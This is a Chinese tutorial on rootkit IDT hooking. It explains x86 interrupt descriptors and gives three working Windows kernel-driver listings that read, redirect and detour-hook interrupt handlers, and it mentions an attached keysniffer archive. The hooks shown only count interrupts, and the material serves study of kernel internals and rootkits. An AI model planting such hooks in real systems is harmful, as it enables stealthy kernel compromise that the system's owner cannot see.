
# Rootkit Hook 之[四]-- IDT Hook

> 原文：[`www.pediy.com/kssd/pediy10/59867.html`](https://www.pediy.com/kssd/pediy10/59867.html)

今天我们一起来学习下 Rootkit 里面的 IDT hook. 由于涉及到一些基本概念，在这里也顺便提一下。呵呵，帖子比较长，慢慢看。闲话少说，直奔主题。

我们首先来了解下什么是 IDT?

IDT = Interrupt Descriptor Table 中断描述表

IDT 是一个有 256 个入口的线形表，每个 IDT 的入口是个 8 字节的描述符，所以整个 IDT 表的大小为 `256*8=2048` bytes，每个中断向量关联了一个中断处理过程。所谓的中断向量就是把每个中断或者异常用一个 0-255 的数字识别。Intel 称这个数字为向量(vector). 如图所示。

对于中断描述表，操作系统使用 `IDTR` 寄存器来记录 `idt` 位置和大小。

`IDTR` 寄存器是 48 位寄存器，用于保存 `idt` 信息。其中低 16 位代表 IDT 的大小，大小为 `7FFH`，高 32 位代表 IDT 的基地址。在我的机器上，基地址是 `8003F400H`. 我们可以利用指令 `sigt` 读出 `IDTR` 寄存器中的信息，从而找到 IDT 在内存中的位置。

![](img/3553ba5be6fc0cee0eea4d7659cb124a.jpg)

IDT 有三种不同的描述符或者说是入口，分别是：

1. 任务门描述符
2. 中断门描述符
3. 陷阱门描述符

也就是说，在保护模式下，`80386` 只有通过中断门、陷阱门或任务门才能转移到对应的中断或异常处理程序。

Intel 参考手册上指出“同步中断”(在一个指令执行完成后，由 CPU 控制单元产生的)作为“异常”。

异步中断（可能会在任意时刻由其他硬件产生的）才称为“中断”。中断被外部的 I/O 设备产生。

但是异常是由编程错误或者是由反常情况（必须由内核来处理）触发的。在该文档中，

术语“中断信号”既指异常又指中断。

中断分为两种类型：可屏蔽中断--它在短时间片段里可被忽略；不可屏蔽中断--它必须被立即处理。例如：硬件失败为不可屏蔽中断，`IRQS`（中断请求）失败为可屏蔽中断。

异常被分为不同的两类：处理器产生的异常(`Faults`, `Traps`, `Aborts`)和编程安排的异常（用汇编指令 `int` or `int3` 触发）。后一种就是我们经常说到的软中断。

我们先看看这三种描述符：

![](img/fae6d646864b578eb7cd18cb96de2126.jpg)

其中：后两种描述符，非常的相似，只有 1 个 bit 位的差别。在处理上，采用相同的处理方式。如图所示，在这后两类的描述符里面记录了一个中断服务程序（ISR )的地址 offset. 在 IDT 的 256 个向量中，除 3 个任务门入口外，其他都是这两种门的入口。并且所有的 `trap`/`interrupt` `gate` 的入口，他们的 `segment` `selector` 都是一样的，即：`08h`. 我们察看 `GDT` 中 `Selector` = `8` 的描述符，描述的是 `00000000h` ~ `0ffffffffh` 的 4G 地址空间。因此，在描述符中的中断服务程序（ISR )的地址 offset 就代表了函数的入口地址。`windows` 在处理的时候，按照下图方式，来处理这两类的描述符入口。即：根据 `segment` `selector` 在 `GDT` 中找出段基地址等信息，然后跟描述符中的中断服务程序（ISR )的地址 offset 相加得到代码段中的函数入口地址。然后调用该函数。

这个过程，我写得比较直接，在操作系统执行这过程时，还有很多的出错判断和异常保护，这里我们略过。

![](img/a49a9bd9275c095f1bf62dfacc326d93.jpg)

接下来，我们看看任务门描述符的情况。

![](img/63d3f3f290b86f1b43d4e8283ab5247c.jpg)

首先，根据 IDT 中任务门描述符的 `TSS` `Segment` `Selector` ,我们在 `GDT` 中找出这个选择子。在这个选择子中，对应一个 `tss` 描述符，即：任务状态段描述符。这个描述符大小为 `068h`, 即 104 字节。

下面是这个任务状态段描述符的格式。

![](img/5482e254104ba01bd67db013598ece64.jpg)

我们看到在这个描述符中记录了任务状态段的位置和大小。

我们根据任务状态段描述符中的 `base` `Address`, 找到 `TSS` 的内存位置。然后我们就可以进行任务切换。所谓任务切换是指，挂起当前正在执行的任务，恢复或启动另一任务的执行。在任务切换过程中，首先，处理器中各寄存器的当前值被自动保存到 `TR` 所指定的 `TSS` 中；然后，下一任务的 `TSS` 的选择子被装入 `TR`；最后，从 `TR` 所指定的 `TSS` 中取出各寄存器的值送到处理器的各寄存器中。由此可见，通过在 `TSS` 中保存任务现场各寄存器状态的完整映象，实现任务的切换。 `TR` 寄存器可见部分保存了 `tss` `selector`, 不可见部分，保存了任务状态段的位置和大小. 如下图所示。

任务状态段 `TSS` 的基本格式如下图所示。

![](img/fc2bd095d44028ab259f3e0fbe3aee50.jpg)

从图中可见，`TSS` 的基本格式由 104 字节组成。这 104 字节的基本格式是不可改变的，但在此之外系统软件还可定义若干附加信息。

![](img/5fcbcc7e7cbd10c176e7ef43a1928252.jpg)

理论的部分，我们简单介绍这么多。接下来，我们透过几个例子来说明下，IDT HOOK。

## 一、透过一个简单的代码，看看 256 个中断向量对应的 ISR

其中任务门的 ISR 没有，由于整个 IDT 中只有 3 个任务门，我们忽略这部分。代码如下：

```c
#include "ntddk.h"

#include <stdio.h>

#define MAKELONG(a, b) ((unsigned long) (((unsigned short) (a)) | ((unsigned long) ((unsigned short) (b))) << 16))

#define MAX_IDT_ENTRIES 0xFF

#pragma pack(1)

// entry in the IDT, this is sometimes called
// an "interrupt gate"

typedef struct
{
  unsigned short LowOffset;
  unsigned short selector;
  unsigned char unused_lo;
  unsigned char segment_type:4;   //0x0E is an interrupt gate
  unsigned char system_segment_flag:1;
  unsigned char DPL:2;           // descriptor privilege level
  unsigned char P:1;            /* present */
  unsigned short HiOffset;
} IDTENTRY;

/* sidt returns idt in this format */
typedef struct
{
  unsigned short IDTLimit;
  unsigned short LowIDTbase;
  unsigned short HiIDTbase;
} IDTINFO;

#pragma pack()

VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
{
  DbgPrint("ROOTKIT: OnUnload called\n");
}

NTSTATUS DriverEntry( IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath )
{
  IDTINFO    idt_info;
  IDTENTRY*  idt_entries;
  unsigned long  count;

  theDriverObject->DriverUnload  = OnUnload;

  // load idt_info
  __asm  sidt  idt_info
  idt_entries = (IDTENTRY*) MAKELONG(idt_info.LowIDTbase,idt_info.HiIDTbase);

  for(count=0;count < MAX_IDT_ENTRIES;count++)
  {
    char _t[255];
    IDTENTRY *i = &idt_entries[count];
    unsigned long addr = 0;
    addr = MAKELONG(i->LowOffset, i->HiOffset);
    _snprintf(_t, 253, "Interrupt %d: ISR 0x%08X", count, addr);
    DbgPrint(_t);
  }

  return STATUS_SUCCESS;
}
```

我们使用 `DebugView` 工具软件，就可以看到打印出来的信息。

## 二、直接替换 idt 中某个中断向量的 ISR

这里采用的办法是，首先保存出中断向量 `0x30` 的 ISR, 然后直接修改中断向量 `0x30` 的 ISR 为我们自定义的函数 `my_interrupt_hook`，每当 `0x30` 号中断产生，就会调用我们自定义的函数。

由于我们自定义的函数里面执行完我们的功能后再跳转到原 isr 函数处执行。因此这种 hook 用户感觉不到，不影响原有功能。在 `OnUnload` 时，恢复原有的中断向量 ISR.

```c
#include "ntddk.h"

#include <stdio.h>

#define MAKELONG(a, b) ((unsigned long) (((unsigned short) (a)) | ((unsigned long) ((unsigned short) (b))) << 16))

#define MAX_IDT_ENTRIES 0xFF
#define NT_INT_TIMER        0x30

unsigned long g_i_count = 0;

///////////////////////////////////////////////////
// IDT structures
///////////////////////////////////////////////////

#pragma pack(1)

// entry in the IDT, this is sometimes called
// an "interrupt gate"

typedef struct
{
  unsigned short LowOffset;
  unsigned short selector;
  unsigned char unused_lo;
  unsigned char segment_type:4;  //0x0E is an interrupt gate
  unsigned char system_segment_flag:1;
  unsigned char DPL:2;          // descriptor privilege level
  unsigned char P:1;            /* present */
  unsigned short HiOffset;
} IDTENTRY;

/* sidt returns idt in this format */
typedef struct
{
  unsigned short IDTLimit;
  unsigned short LowIDTbase;
  unsigned short HiIDTbase;
} IDTINFO;

#pragma pack()

unsigned long old_ISR_pointer;  // better save the old one!!

VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
{
  IDTINFO    idt_info;    // this structure is obtained by calling STORE IDT (sidt)
  IDTENTRY*  idt_entries;  // and then this pointer is obtained from idt_info
  char _t[255];

  // load idt_info
  __asm  sidt  idt_info
  idt_entries = (IDTENTRY*) MAKELONG(idt_info.LowIDTbase,idt_info.HiIDTbase);

  DbgPrint("ROOTKIT: OnUnload called\n");

  _snprintf(_t, 253, "called %d times", g_i_count);
  DbgPrint(_t);

  DbgPrint("UnHooking Interrupt...");

  // restore the original interrupt handler
  __asm cli
  idt_entries[NT_INT_TIMER].LowOffset = (unsigned short) old_ISR_pointer;
  idt_entries[NT_INT_TIMER].HiOffset = (unsigned short)((unsigned long)old_ISR_pointer >> 16);
  __asm sti
  DbgPrint("UnHooking Interrupt complete.");
}

// using stdcall means that this function fixes the stack before returning (opposite of cdecl)
void __stdcall count_syscall( unsigned long system_call_number )
{
  g_i_count++;
}

// naked functions have no prolog/epilog code - they are functionally like the
// target of a goto statement
__declspec(naked) my_interrupt_hook()
{
  __asm
  {
    push  eax
    call  count_syscall
    jmp   old_ISR_pointer
  }
}

NTSTATUS DriverEntry( IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath )
{
  IDTINFO    idt_info;    // this structure is obtained by calling STORE IDT (sidt)
  IDTENTRY*  idt_entries;  // and then this pointer is obtained from idt_info
  IDTENTRY*  i;
  unsigned long   addr;
  unsigned long  count;
  char _t[255];

  theDriverObject->DriverUnload  = OnUnload;

  // load idt_info
  __asm  sidt  idt_info
  idt_entries = (IDTENTRY*) MAKELONG(idt_info.LowIDTbase,idt_info.HiIDTbase);

  for(count=0;count < MAX_IDT_ENTRIES;count++)
  {
    i = &idt_entries[count];
    addr = MAKELONG(i->LowOffset, i->HiOffset);
    _snprintf(_t, 253, "Interrupt %d: ISR 0x%08X", count, addr);
    DbgPrint(_t);
  }

  DbgPrint("Hooking Interrupt...");
```



```
  // lets hook an interrupt
  
  // exercise - choose your own interrupt
  
  old_ISR_pointer = MAKELONG(idt_entries[NT_INT_TIMER].LowOffset,idt_entries[NT_INT_TIMER].HiOffset);  

// debug, use this if you want some additional info on what is going on  

#if 0  
  
  _snprintf(_t, 253, "old address for ISR is 0x%08x", old_ISR_pointer);  
  
  DbgPrint(_t);  
  
  _snprintf(_t, 253, "address of my function is 0x%08x", my_interrupt_hook);  
  
  DbgPrint(_t);  
  
#endif  
  
  // remember we disable interrupts while we patch the table  
  
  __asm cli  
  
  idt_entries[NT_INT_TIMER].LowOffset = (unsigned short)my_interrupt_hook;  
  
  idt_entries[NT_INT_TIMER].HiOffset = (unsigned short)((unsigned long)my_interrupt_hook >> 16);  
  
  __asm sti  
  
// debug - use this if you want to check what is now placed in the interrupt vector  
  
#if 0  
  
  i = &idt_entries[NT_INT_TIMER];  
  
  addr = MAKELONG(i->LowOffset, i->HiOffset);  
  
  _snprintf(_t, 253, "Interrupt ISR 0x%08X", addr);  
  
  DbgPrint(_t);   
  
#endif  
  
  DbgPrint("Hooking Interrupt complete");  
  
  return STATUS_SUCCESS;  
  
}  
```

三、这个示例中 hook 了整个 `idt` 表，采用的方式是：

1) 首先保留出每个中断向量的 `ISR`。为每一个中断向量的调用设置了一个计数器，并将计数器清零。

2) 为整个 `IDT` 建立一个 detour 内存表，内存表中的每一项对应于每个中断向量。每一项的空间中保存了一个函数，在这个函数中，会调用一个公共的计数函数，用于统计每个中断 `ISR` 调用的次数，函数的最后会调用该中断向量原 `ISR`。

3) 修改 `IDT` 表中的每一个中断向量 `ISR` 为 detour 内存表中相应项的函数。

4) `OnUnload` 中打印出每个中断向量 `ISR` 调用的次数，并恢复原 `ISR`。

```
#include "ntddk.h"

#include <stdio.h>

#define MAKELONG(a, b) ((unsigned long) (((unsigned short) (a)) | ((unsigned long) ((unsigned short) (b))) << 16)) 

// set this to the max int you want to hook 

#define MAX_IDT_ENTRIES 0xFF 

// the starting interrupt for patching 

// to 'skip' some troublesome interrupts 

// at the beginning of the table (TODO, find out why) 

#define START_IDT_OFFSET 0x00 

unsigned long g_i_count[MAX_IDT_ENTRIES]; 

unsigned long old_ISR_pointers[MAX_IDT_ENTRIES];  // better save the old one!! 

#ifdef _DEBUG 

// debuggering version nops out our 'hook' 

// this works w/ no crashes 

char jump_template[] = { 

  0x90,                     //nop, debug 

  0x60,                     //pushad 

  0x9C,                     //pushfd 

  0xB8, 0xAA, 0x00, 0x00, 0x00,            //mov eax, AAh 

  0x90,                     //push eax 

  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,             //call 08:44332211h 

  0x90,                     //pop eax 

  0x9D,                     //popfd 

  0x61,                     //popad 

  0xEA, 0x11, 0x22, 0x33, 0x44, 0x08, 0x00           //jmp 08:44332211h 

}; 

#else 

char jump_template[] = { 

  0x90,                     //nop, debug 

  0x60,                     //pushad 

  0x9C,                     //pushfd 

  0xB8, 0xAA, 0x00, 0x00, 0x00,            //mov eax, AAh 

  0x50,                     //push eax 

  0x9A, 0x11, 0x22, 0x33, 0x44, 0x08, 0x00,          //call 08:44332211h 

  0x58,                     //pop eax 

  0x9D,                     //popfd 

  0x61,                     //popad 

  0xEA, 0x11, 0x22, 0x33, 0x44, 0x08, 0x00           //jmp 08:44332211h 

}; 

#endif 

char * idt_detour_tablebase; 

/////////////////////////////////////////////////// 

// IDT structures 

/////////////////////////////////////////////////// 

#pragma pack(1) 

// entry in the IDT, this is sometimes called 

// an "interrupt gate" 

typedef struct 

{ 

  unsigned short LowOffset; 

  unsigned short selector; 

  unsigned char unused_lo; 

  unsigned char segment_type:4;  //0x0E is an interrupt gate 

  unsigned char system_segment_flag:1; 

  unsigned char DPL:2;  // descriptor privilege level  

  unsigned char P:1; /* present */ 

  unsigned short HiOffset; 

} IDTENTRY; 

/* sidt returns idt in this format */ 

typedef struct 

{ 

  unsigned short IDTLimit; 

  unsigned short LowIDTbase; 

  unsigned short HiIDTbase; 

} IDTINFO; 

#pragma pack() 

VOID OnUnload( IN PDRIVER_OBJECT DriverObject ) 

{   

  int i; 

  IDTINFO    idt_info;    // this structure is obtained by calling STORE IDT (sidt) 

  IDTENTRY*  idt_entries;  // and then this pointer is obtained from idt_info 

  char _t[255]; 

  // load idt_info 

  __asm  sidt  idt_info   

  idt_entries = (IDTENTRY*) MAKELONG(idt_info.LowIDTbase,idt_info.HiIDTbase); 

  DbgPrint("ROOTKIT: OnUnload called\n"); 

  for(i=START_IDT_OFFSET;i<MAX_IDT_ENTRIES;i++) 

  { 

    _snprintf(_t, 253, "interrupt %d called %d times", i, g_i_count[i]); 

    DbgPrint(_t); 

  } 

  DbgPrint("UnHooking Interrupt..."); 

  for(i=START_IDT_OFFSET;i<MAX_IDT_ENTRIES;i++) 

  { 

    // restore the original interrupt handler 

    __asm cli 

    idt_entries[i].LowOffset = (unsigned short) old_ISR_pointers[i]; 

    idt_entries[i].HiOffset = (unsigned short)((unsigned long)old_ISR_pointers[i] >> 16); 

    __asm sti 

  } 

  DbgPrint("UnHooking Interrupt complete."); 

} 

// using stdcall means that this function fixes the stack before returning (opposite of cdecl) 

// interrupt number passed in EAX 

void __stdcall count_interrupts(unsigned long inumber) 

{ 

  //todo, may have collisions here? 

  unsigned long *aCountP;   

  unsigned long aNumber; 

  // due to far call, we need to correct the base pointer 

  // the far call pushes a double dword as the return address 

  // and I don't know how to make the compiler understand this 

  // is a __far __stdcall (or whatever it's called) 

  // anyway: 

  // 

  // [ebp+0Ch] == arg1 

  // 

  __asm mov eax, [ebp+0Ch] 

  __asm mov aNumber, eax 

  //__asm int 3 

  aNumber = aNumber & 0x000000FF; 

  aCountP = &g_i_count[aNumber];   

  InterlockedIncrement(aCountP); 

} 

NTSTATUS DriverEntry( IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath ) 

{ 

  IDTINFO    idt_info;    // this structure is obtained by calling STORE IDT (sidt) 

  IDTENTRY*  idt_entries;  // and then this pointer is obtained from idt_info 

  IDTENTRY*  i; 

  unsigned long   addr; 

  unsigned long  count; 

  char _t[255]; 

  theDriverObject->DriverUnload  = OnUnload;   

  for(count=START_IDT_OFFSET;count<MAX_IDT_ENTRIES;count++) 

  { 

    g_i_count[count]=0; 

  } 

  // load idt_info 

  __asm  sidt  idt_info 

  idt_entries = (IDTENTRY*) MAKELONG(idt_info.LowIDTbase,idt_info.HiIDTbase); 

  //////////////////////////////////////////// 

  // save old idt pointers 

  //////////////////////////////////////////// 

  for(count=START_IDT_OFFSET;count < MAX_IDT_ENTRIES;count++) 

  { 

    i = &idt_entries[count]; 

    addr = MAKELONG(i->LowOffset, i->HiOffset); 

    _snprintf(_t, 253, "Interrupt %d: ISR 0x%08X", count, addr); 

    DbgPrint(_t); 

    old_ISR_pointers[count] = MAKELONG(idt_entries[count].LowOffset,idt_entries[count].HiOffset); 

  } 

  /////////////////////////////////////////// 

  // setup the detour table 

  /////////////////////////////////////////// 

  idt_detour_tablebase = ExAllocatePool(NonPagedPool, sizeof(jump_template)*256); 

  for(count=START_IDT_OFFSET;count<MAX_IDT_ENTRIES;count++) 

  { 

    int offset = sizeof(jump_template)*count;   

    char *entry_ptr = idt_detour_tablebase + offset; 

    // entry_ptr points to the start of our jump code in the detour_table 

    // copy the starter code into the template location 

    memcpy(entry_ptr, jump_template, sizeof(jump_template)); 

#ifndef _DEBUG 

    // stamp the interrupt number 

    entry_ptr[4] = (char)count; 

    // stamp the far call to the hook routine 

    *( (unsigned long *)(&entry_ptr[10]) ) = (unsigned long)count_interrupts; 

#endif 

    // stamp the far jump to the original ISR 

    *( (unsigned long *)(&entry_ptr[20]) ) = old_ISR_pointers[count]; 
```



```
// finally, make the interrupt point to our template code  
__asm cli  
idt_entries[count].LowOffset = (unsigned short)entry_ptr;  
idt_entries[count].HiOffset = (unsigned short)((unsigned long)entry_ptr >> 16);  
__asm sti  
}  
DbgPrint("Hooking Interrupt complete");  
return STATUS_SUCCESS;  
}
```

后面再附上一个`Greg Hoglund`的例子，请大家欣赏。

上传的附件

| `![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg)` || `bhwin_keysniff.rar`  
 |
